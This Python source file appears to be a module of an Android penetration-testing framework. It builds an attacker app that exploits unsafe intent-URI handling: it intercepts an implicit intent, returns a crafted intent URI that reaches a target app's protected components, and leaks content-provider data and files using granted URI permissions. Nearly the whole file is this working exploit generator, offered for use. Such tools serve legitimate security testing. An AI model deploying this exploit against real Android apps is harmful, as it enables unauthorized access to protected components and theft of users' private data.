from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "unsafe_intent_uri_component_implicit"
        self._template = Template()


    def register_options(self):
        # option_state.add_options([
            # OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
            # OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
            # OptBool("LEAK_PROVIDER", [True, "Leak content provider (Default: False)", False]),
            # OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            # OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            # OptStr("TARGET_CLASS", [False, "Target class name"]),
            # OptStr("STRING_EXTRA", [True, "String URL extra key"]),
            # OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
            # OptStr("BUNDLE_STRING", [False, "Parcel bundle key"]),
            # OptStr("INTERCEPT_ACTION", [True, "Action name to intercept"]),
            # OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
            # OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
            # OptList("PUT_EXTRA", [False, "Intent extra data"]),
            # OptList("IPUT_EXTRA", [False, "Intercept intent extra data"]),
            # OptList("COMPONENT_EXTRA", [False, "Protected component intent extra data"]),
            # OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
            # OptEnum("FILTER_LEVEL", [True, "Intent URI filter level (0: No filter, 1: Filtered component) (Default: 0)", 0, [0, 1]]),
            # OptEnum("RESULT_CODE", [True, "Result code returned to the caller (Default: -1)", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        # ])

        option_state.add_options({
            "exploit": [
                OptBool("IS_EXPORTED", [True, "Whether the target component is exported (Default: False)", False]),
                OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
                OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
                OptStr("TARGET_PACKAGE", [True, "Target package name"]),
                OptStr("TARGET_CLASS", [False, "Target class name"]),
                OptStr("ACTION_NAME", [False, "Intent action name"]),
                OptList("PUT_EXTRA", [False, "Intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
            ],
            "interceptor": [
                OptStr("STRING_EXTRA", [True, "String URL extra key"]),
                OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
                OptStr("BUNDLE_STRING", [False, "Parcel bundle key"]),
                OptStr("INTERCEPT_ACTION", [True, "Action name to intercept"]),
                OptStr("RESULT_CODE", [True, "Result code returned to the caller (Default: -1)", -1]),
                OptList("IPUT_EXTRA", [False, "Intercept intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
            ],
            "protected": [
                OptBool("LEAK_PROVIDER", [True, "Leak content provider [Only possible if URI_ALLOW_UNSAFE flag is configured] (Default: False)", False]),
                OptEnum("PROVIDER_TYPE", [False, "Content provider type [1: Share content, 2: Access to files]", "", [1, 2]]),
                OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
                OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
                OptList("CPUT_EXTRA", [False, "Protected component intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
            ]
        })

        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "leak_provider": {
                "pos": ["provider_type", "provider_uri"],
                "neg": ["component_class"]
            },
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": []
            },
            "is_exported": {
                "pos": ["via_deeplink", "target_class"],
                "neg": []
            }
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        is_exported = opts['IS_EXPORTED']
        via_deeplink = opts['VIA_DEEPLINK']
        leak_provider = opts['LEAK_PROVIDER']
        deeplink_uri = opts['DEEPLINK_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        action_name = opts['ACTION_NAME']
        string_extra = opts['STRING_EXTRA']
        bundle_extra = opts['BUNDLE_EXTRA']
        bundle_string = opts['BUNDLE_STRING']
        intercept_action = opts['INTERCEPT_ACTION']
        protected_component_class = opts['COMPONENT_CLASS']
        provider_uri = opts['PROVIDER_URI']
        put_extra = opts['PUT_EXTRA']
        intercept_put_extra = opts['IPUT_EXTRA']
        protected_component_extra = opts['CPUT_EXTRA']
        provider_type = opts['PROVIDER_TYPE']
        result_code = opts['RESULT_CODE']

        exploit_activity_name = self.activity_name(self._id, target_package)
        intercept_activity_name = f'{self.activity_name(self._id, target_package)}Intercept'
        leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'

        manifest = [
            self._template.build_manifest_component(
                exploit_activity_name
            ),
            self._template.build_manifest_component(
                intercept_activity_name, 
                is_exported=True,
                intercept=True, 
                action=intercept_action
            ),
            self._template.build_manifest_component(
                leak_provider_activity_name, 
                is_exported=True
            )
        ]

        extras = list()
        if intercept_put_extra != "":
            for extra in intercept_put_extra:
                extras.append([extra[0], f'"{extra[1]}"'])
        if string_extra != "":
            extras.append([string_extra, "intentUri"])
        if bundle_extra != "":
            extras.append([bundle_extra, "bundle"])

        intercept_activity = self._template.build_activity(
            name=intercept_activity_name,
            libs=[
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[
                self._template.build_intent(
                    intent_var="target",
                    set_data=f'"{provider_uri}"' if leak_provider else None,
                    set_selector=[self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class],
                    put_extra=[[extra[0], f'"{extra[1]}"'] for extra in protected_component_extra] if protected_component_extra != "" else [],
                    set_classname=[self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class],
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"] if leak_provider else [],
                    start_activity=False
                ),
                'String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);',
                'Bundle bundle = new Bundle();',
                f'bundle.putString("{bundle_string}", intentUri);' if bundle_string != "" else "",
                self._template.build_intent(
                    set_data="intentUri",
                    put_extra=extras,
                    start_activity=False,
                    set_result=True,
                    result_code=result_code
                )
            ],
            finish=True
        )

        exploit_activity = self._template.build_activity(
            name=exploit_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else action_name if action_name != "" else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
                set_classname=[target_package, target_class] if not via_deeplink else []
            )]
        )

        leak_provider_activity = self._template.build_activity(
            name=leak_provider_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = Uri.parse(getIntent().getDataString());",
                self._template.resolve_content(provider_type)
            ]
        )

        component = [
            {
                "name": f"{exploit_activity_name}.java",
                "content": exploit_activity
            },
            {
                "name": f"{intercept_activity_name}.java",
                "content": intercept_activity
            },
            {
                "name": f"{leak_provider_activity_name}.java",
                "content": leak_provider_activity
            }
        ]

        if not leak_provider:
            manifest.pop()
            component.pop()
        if not is_exported:
            manifest.pop(0)
            component.pop(0)

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
            "bind_button": self._template.bind_button(self._id, target_package, exploit_activity_name) if is_exported else None,
            "component": component
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Process failed, terminating module.")
            return
        
        self.check_component_log(opts)

        self.check_logcat()